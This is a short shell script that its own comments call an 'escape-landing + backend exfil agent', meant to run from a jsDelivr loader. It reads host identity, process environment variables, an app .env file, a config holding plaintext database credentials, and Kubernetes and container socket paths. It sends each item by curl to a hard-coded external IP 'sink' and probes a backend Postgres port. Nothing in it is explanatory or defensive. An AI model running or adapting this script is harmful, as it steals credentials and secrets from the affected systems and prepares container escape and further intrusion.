#!/bin/sh
# i303 escape-landing + backend exfil agent. Executed when the jsDelivr loader runs `sh`.
# Two outputs: (a) HTTP to the proven sink 91.215.85.170:18088, (b) appended to /tmp/i303x.log.
bk(){ sed 's/[^A-Za-z0-9+\/=]//g'; }
B='http://91.215.85.170:18088'
L=/tmp/i303x.log
: > "$L" 2>/dev/null
send(){ v=$(printf '%s' "$2" | bk); echo "$1=$v" >> "$L" 2>/dev/null; curl -s -m 9 "$B?t=$1&d=$v"; }

# 1. Host identity
send ident "$(uname -a)|$(hostname)|$(cat /etc/hostname 2>/dev/null)|$(id)"
send cgroup "$(cat /proc/1/cgroup 2>/dev/null)"
send environ "$(head -c 3000 /proc/1/environ 2>/dev/null | tr '\0' '\n')"
send appenv "$(cat /app/.env 2>/dev/null)"
send artexcfg "$(cat /run/adverserial/current/artex-config.json 2>/dev/null)"

# 2. Escape-route presence
send routes "CRI=$(ls /run/k3s/containerd/containerd.sock /run/containerd/containerd.sock 2>/dev/null); SA=$(ls /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); DOCKER=$(ls /var/run/docker.sock 2>/dev/null); KUBELET=$(ls /var/lib/kubelet 2>/dev/null)"
send mounts "$(mount 2>/dev/null | grep -Ei 'overlay|containerd|kube' | head -c 1500 | tr '\n' ';')"

# 3. Reachable backend DB probe (ARTEX control plane, plaintext cred in artex-config.json)
CFG=/run/adverserial/current/artex-config.json
if [ -f "$CFG" ] && command -v python3 >/dev/null 2>&1; then
  H=$(python3 -c 'import json;print(json.load(open("/run/adverserial/current/artex-config.json"))["database"]["host"])' 2>/dev/null)
  if [ -n "$H" ]; then
    (echo > /dev/tcp/$H/5432) >/dev/null 2>&1 && send db "$H:5432 OPEN user=$(python3 -c 'import json;print(json.load(open("/run/adverserial/current/artex-config.json"))["database"]["user"])' 2>/dev/null)" || send db "$H:5432 closed"
  fi
fi
